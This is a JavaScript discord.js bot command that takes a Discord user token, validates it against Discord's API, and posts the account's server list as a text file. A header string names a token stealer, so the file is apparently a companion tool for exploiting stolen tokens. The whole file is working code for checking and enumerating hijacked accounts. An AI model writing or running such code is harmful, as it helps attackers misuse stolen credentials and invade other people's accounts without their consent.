const Discord = require("discord.js");
const axios = require('axios').default;

module.exports.run = async (bot, message, args) => {
  let token = args[0];
  if (!token) return message.channel.send(`Invalid argument! Use: ${bot.config.prefix}guild <token>`);
  let json;
  await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
          "Content-Type": "application/json",
          "authorization": token
      }
  }).then(res => { json = res.data })
      .catch(() => { })
  if (!json) return message.channel.send('Invalid token!');
  await takeGuilds(token)

  async function takeGuilds(token) {
    let guild_str = ''
    guild_str += 'GUILDS FROM: ' + token + '  #RUSTLERSTEALERSOSEX\n\n'
    try {
        var apiguild = await axios.get('https://discord.com/api/v9/users/@me/guilds', {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        })
        var json = apiguild.data
        guild_str += json.map(g => `GUILD_NAME: ${g.name} - GUILD_ID: ${g.id} - GUILD_OWNER: ${g.owner ? "Yes" : "No"}`).join('\n')
        let buffer = Buffer.from(guild_str)
        return message.channel.send({ files: [new Discord.MessageAttachment(buffer, 'guilds.txt')] })
    } catch { 
        return message.channel.send('An error occured') 
    }
}
}

module.exports.help = {
  name: "guilds"
}
